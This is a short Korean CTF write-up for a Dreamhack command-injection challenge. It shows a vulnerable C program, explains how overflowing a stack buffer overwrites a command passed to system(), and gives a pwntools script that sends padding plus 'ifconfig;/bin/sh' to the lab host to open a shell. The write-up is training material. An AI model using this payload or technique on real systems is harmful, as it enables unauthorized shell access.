# Exploit Tech: Command Injection

![image](https://github.com/user-attachments/assets/d45df683-36b4-4023-99dc-57b9cb60a5df)

**문제 코드**

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void init() {
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
}

int main()
{

    char cmd_ip[256] = "ifconfig";
    int dummy;
    char center_name[24];

    init();

    printf("Center name: ");
    read(0, center_name, 100);

    if( !strncmp(cmd_ip, "ifconfig", 8)) {
        system(cmd_ip);
    }

    else {
        printf("Something is wrong!\n");
    }
    exit(0);
}
```

코드를 쭉 보니 center_name 에 오버플로우가 일어나므로   
cmd_ip 자리에 원하는 문자를 쓸 수 있을 거 같다.   
 
그리고 cmp_ip 앞 8자리를 검사하는 코드가 있으므로 ifconfig 은 넣고 그 뒤에 메타 문자와 원하는 코드를 쓰면 될 것 같다.  

<br>

![image](https://github.com/user-attachments/assets/83a9f5d2-cc80-4c14-bb2d-be8d1bd72e96)  
read 전에 브레이크를 걸어주고  
A 24바이트를 넣어줬다.
<br>

![image](https://github.com/user-attachments/assets/b9b476ff-206f-4340-927a-d8268bb582d7)  
![image](https://github.com/user-attachments/assets/b55ece03-b843-49f2-a794-1142e04f79fd)  

각 변수들이 스택 어디에 저장되어 있는지 알 수 있으므로  
쓰레기값 32바이트 + ifconfig + ; + 원하는 코드  
를 쓰면 원하는 동작을 이끌어 낼 수 있을거다.  


**익스플로잇 코드**
```python
from pwn import *

p = remote("host3.dreamhack.games", 8866)

payload = b'A'*24
payload += b'B'*8
payload += b'ifconfig'
payload += b';/bin/sh'

p.send(payload)
p.interactive()

```

이제 이걸 보내면

![image](https://github.com/user-attachments/assets/749975dd-9434-41de-8e5d-3c2f8eeb831a)

답을 쉽게 얻을 수 있다.
